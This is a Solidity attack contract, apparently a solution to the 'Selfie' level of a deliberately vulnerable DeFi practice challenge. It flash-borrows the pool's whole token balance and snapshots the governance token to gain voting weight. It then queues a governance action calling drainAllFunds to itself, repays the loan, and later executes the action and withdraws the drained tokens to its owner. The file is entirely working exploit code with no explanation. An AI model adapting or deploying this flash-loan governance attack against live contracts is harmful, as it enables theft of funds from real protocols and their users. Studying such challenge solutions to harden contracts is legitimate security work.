pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";

// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20Snapshot.sol";

interface IDVTSnapshot {
    function snapshot() external returns (uint256);

    function getBalanceAtLastSnapshot(address) external returns (uint256);
}

interface IERC20Stub {
    function transfer(address, uint256) external;

    function balanceOf(address) external returns (uint256);
}

interface ISelfiePool {
    function token() external returns (IERC20Stub);

    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function governanceToken() external returns (IDVTSnapshot);

    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract AttackSelfiePool {
    ISelfiePool pool;
    ISimpleGovernance governance;
    address owner;
    uint256 actionId;

    event PrintUint256(uint256);
    event PrintS(string);

    // 0x9da9df2Fe440fA9E05B620a05990d7c644aCBBB8,0xe5f0332CA42459333149b67aF2d0E486D03F8a83
    constructor(address _pool, address _governance) public {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        owner = msg.sender;
    }

    uint8 public step;

    function hack(uint8 _step) public {
        require(msg.sender == owner, "nice try ;)");
        step = _step;
        uint256 amount = pool.token().balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address _tokenAddress, uint256 _amount) external {
        // emit PrintS("receiveTokens called");
        uint256 lastId = governance.governanceToken().snapshot();
        // emit PrintUint256(lastId);
        governance.governanceToken().getBalanceAtLastSnapshot(address(this));
        lastId = governance.governanceToken().snapshot();
        // emit PrintUint256(lastId);
        uint256 amount =
            governance.governanceToken().getBalanceAtLastSnapshot(
                address(this)
            );
        // emit PrintUint256(amount);

        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", this),
            uint256(0)
        );
        emit PrintUint256(actionId);

        IERC20Stub(_tokenAddress).transfer(address(pool), _amount);
    }

    function executeLastAction() public {
        governance.executeAction(actionId);
    }

    function withdraw() public {
        require(msg.sender == owner, "say whaaat?!");
        pool.token().transfer(
            msg.sender,
            pool.token().balanceOf(address(this))
        );
    }
}
